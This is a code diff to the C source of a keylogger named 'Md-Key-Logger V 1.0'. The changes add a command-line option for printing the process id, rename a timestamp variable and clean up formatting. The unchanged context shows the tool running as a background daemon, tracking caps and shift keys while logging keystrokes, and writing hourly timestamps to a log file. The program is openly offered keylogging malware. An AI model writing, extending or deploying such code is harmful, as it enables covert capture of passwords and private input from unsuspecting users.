@@ -24,11 +24,12 @@ int main(int argc, char **argv) {
     int option_index;
     int get_stream_key;
     bool daemon_mod = false;
+    bool pid_mod = false;
     bool caps_pressed = false;
     bool shift_pressed = false;
     int readable = 1;
     char stream_path[128];
-    char timestring[80];
+    char time_string[80];
     char *log_file;
     FILE *log;
 
@@ -38,11 +39,12 @@ int main(int argc, char **argv) {
     static struct option long_options[] = {
         {"log file path", required_argument, NULL, 'l'},
         {"daemon", no_argument, NULL, 'd'},
+        {"get process id", no_argument, NULL, 'p'},
         {"help", no_argument, NULL, 'h'},
         {0, 0, 0, 0}
     };
 
-    while ((choose = getopt_long(argc, argv, "l:dh", long_options, &option_index)) != -1) {
+    while ((choose = getopt_long(argc, argv, "l:dhp", long_options, &option_index)) != -1) {
         switch (choose) {
             case 'l':
                 log_file = optarg;
@@ -50,11 +52,15 @@ int main(int argc, char **argv) {
             case 'd':
                 daemon_mod = true;
                 break;
+            case 'p':
+                pid_mod = true;
+                break;
             case 'h':
                 printf(" Md-Key-Logger V 1.0\n"
                         " Usage: [OPTION]...\n"
                         "  -l, --log-file <file>  write log to FILE (default=/var/log/MD-key-logger.log)\n"
                         "  -d, --daemon  run as daemon\n"
+                        "  -p, --pid  get Process id\n"
                         "  -h, --help    show this message\n"
                         "  \n");
                 return EXIT_SUCCESS;
@@ -66,7 +72,7 @@ int main(int argc, char **argv) {
         return EXIT_FAILURE;
     }
 
-    if ( strlen(log_file) >= 1 ) {
+    if (strlen(log_file) >= 1) {
         if (!(log = fopen(log_file, "a"))) {
             perror("fopen");
             return EXIT_FAILURE;
@@ -92,9 +98,9 @@ int main(int argc, char **argv) {
         change_task_to_background();
     }
 
-    get_time_now(timestring);
-    fprintf(log, "\n Starting key logger: %s\n", timestring);
-    bzero(timestring, 80);
+    get_time_now(time_string);
+    fprintf(log, "\n Starting key logger: %s\n", time_string);
+    bzero(time_string, 80);
     start = clock();
 
     while (readable > 0) {
@@ -136,12 +142,12 @@ int main(int argc, char **argv) {
         }
         end = clock();
         if ((((end - start)) / CLOCKS_PER_SEC) >= 3600) { // log time every one hour
-            get_time_now(timestring);
-            fprintf(log, "\n%s\n", timestring);
+            get_time_now(time_string);
+            fprintf(log, "\n%s\n", time_string);
             fflush(log);
             start = 0;
             end = 0;
-            bzero(timestring, 80);
+            bzero(time_string, 80);
         }
     }
 
